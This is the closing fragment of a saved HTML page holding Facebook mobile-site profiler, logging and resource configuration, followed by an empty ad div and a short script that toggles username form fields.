                        blur: 0,
                        load: 0,
                        error: 0,
                        message: 0,
                        abort: 0,
                        storage: 0,
                        scroll: 200000,
                        mousemove: 20000,
                        mouseover: 10000,
                        mouseout: 10000,
                        mousewheel: 1,
                        MSPointerMove: 10000,
                        keydown: 0.1,
                        click: 0.02,
                        mouseup: 0.02,
                        __100ms: 0.001,
                        __default: 5000,
                        __min: 100,
                        __interactionDefault: 200,
                        __eventDefault: 100000
                    },
                    page_sampling_boost: 1,
                    interaction_regexes: {},
                    interaction_boost: {},
                    event_types: {},
                    manual_instrumentation: false,
                    profile_eager_execution: false,
                    disable_heuristic: true,
                    disable_event_profiler: false
                }, 1726], ["KillabyteProfilerConfig", [], {
                    htmlProfilerModule: null,
                    profilerModule: null,
                    depTypes: {BL: "bl", NON_BL: "non-bl"}
                }, 1145], ["QuicklingConfig", [], {
                    version: "1003848272;0;",
                    sessionLength: 30,
                    inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                    badRequestKeys: ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"],
                    logRefreshOverhead: false
                }, 60]],
                require: [["NavigationMetrics", "setPage", [], [{
                    page: "/wap/index.php",
                    page_type: "normal",
                    page_uri: "https://m.facebook.com/",
                    serverLID: "6966125832479156457-0"
                }]], ["CavalryLoggerImpl", "startInstrumentation", [], []], ["ServiceWorkerURLCleaner", "removeRedirectID", [], []]]
            },
            hsrp: {
                hblp: {
                    sr_revision: 1003848272,
                    consistency: {rev: 1003848272},
                    rsrcMap: {
                        FEt5GzN: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/JopZtdti8dq.js?_nc_x=Ij3Wp8lg5Kz"
                        }
                    }
                }
            },
            allResources: ["hHxG4He", "s3cC9PY", "/57qFCN", "Mwuc/jX", "BGVORZa", "2fmZT0K", "FEt5GzN"],
            onload: ["CavalryLogger.getInstance(\"6966125832479156457-0\").setTTIEvent(\"t_domcontent\");"],
            onafterload: ["window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");", "if (window.ExitTime){CavalryLogger.getInstance(\"6966125832479156457-0\").setValue(\"t_exit\", window.ExitTime);};"]
        });
    }));</script>
<div class="AdBox Ad advert post-ads"></div>
<script>
    function reshowusername() {
        document.getElementById('form-username').style.display = 'block';
        document.getElementById('form-hasusername').style.display = 'none';
    }
</script>
</body>
</html>
